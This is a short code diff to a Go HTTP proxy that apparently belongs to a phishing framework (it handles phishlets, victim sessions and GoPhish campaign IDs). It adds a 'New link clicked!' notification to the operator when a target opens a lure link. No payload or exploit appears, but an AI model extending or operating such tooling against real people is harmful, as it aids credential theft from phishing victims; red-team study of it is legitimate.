@@ -424,6 +424,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
+									if p.cfg.GetSiteNotifyMode(pl.Name) != "off" {
+										// Send notification
+										SendNotification(pl.Name, "New link clicked!", "", p.cfg.IsSiteNotifyModeMinimal(pl.Name))
+									}
+
 									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 										rid, ok := session.Params["rid"]
 										if ok && rid != "" {
